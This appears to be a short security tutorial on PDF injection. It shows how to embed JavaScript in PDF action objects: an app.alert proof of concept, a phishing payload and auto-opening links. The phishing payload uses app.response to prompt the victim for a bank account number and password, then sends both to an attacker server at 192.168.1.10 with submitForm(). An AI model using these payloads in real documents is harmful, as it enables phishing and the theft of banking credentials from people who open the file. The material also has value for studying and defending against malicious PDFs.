# PDF Injection

## Introduction

Popup Windows (dialogs) are an important component of Acrobat interactivity. Popup Windows provides the user with error messages, warnings, and other key information. They ask the user questions and collect input. Acrobat has several types of built-in Popup Windows (alert, response, and file open), as well as functions for creating custom dialogs.

Will demonstrate how to create the “alert(1)” of PDF injection and how to improve it to inject JavaScript that can steal credentials and open a malicious link.

We can inject code in PDF like XSS injection inside the javascript function call. In normal XSS you need to make sure the syntax is correct and valied, the same principle is applied to PDF except the injection is inside an object, such as javascript, text stream or annotation URI.

### XSS

To perform an XSS we inject our payload in javascript object and make sure the parenthesis are closed correctly. you can note that the injection was successful if the PDF render correctly without any error. Breaking the PDF is nice, but we need to ensure we could execute JavaScript of course. I started XSS with a popup alert by injecting a javascript code to the PDF file as following.

#### Alert Box

The app.alert() function is used to display a popup box to the victim.

```bash
<<
/Type /Action
/S /JavaScript
/JS (app.alert('XSS');)
>>
```

This will pop up alert box when PDF file open.

##### Stealing Credentials

Most banks send monthly statements protected with the client’s account and password, The client can be phished and stolen his credentials if he is a victim of a phishing attack.

The following scenario demonstrate how an attacker can steal credentials and send them to his server using submit form method.

The first argument to app.response() is the text displayed in the body of the Response Box. This is the standard input, but the Response Box can be called with no arguments at all since it always displays a text input box. The text entered in this box will be returned to the account variable if the user presses the OK button to exit the dialog. If they press Cancel , account will be null, same thing in the second argument.

In cURL variable, the attacker server is added along with the account and password collected from the victim, this submitted to the attacker using submitForm() function.

```bash
<<
/Type /Action
/S /JavaScript
/JS
(
var account = app.response ({ cQuestion:"Enter your Bank Account Number", cTitle:"Bank Account Details", bPassword:false, cDefault: global.cLastPswd, cLabel:"A/C"});
var password = app.response ({ cQuestion:"Enter your Bank Account Passowrd", cTitle:"Bank Account Details", bPassword:true, cDefault: global.cLastPswd, cLabel:"Password"});
var cURL = "http://192.168.1.10:443" + "?" + "account=" + account + "&password=" + password;
this.submitForm({cURL: encodeURI(cURL), cSubmitAs: 'HTML'});
)
>>
```

#### Open Malicious Link

An attacker can embed a malicious link in a PDF, when the victim opens the PDF a popup message of security warning will show, if the link looks legitimate the victim may click allow and open a malicious website.

The URI method allowed launching a link while opening the PDF, which can misuse by attackers to launch malicious links.

```bash
<<
/Type /Action
/S /URI
/URI (https://twitter.com/0xCyberY)
>>
```

The same can be approached using app.launchURL() function in the javascript object.

```bash
<<
/Type /Action
/S /JavaScript
/JS
(
app.launchURL("https://twitter.com/0xCyberY", true);
)
>>
```
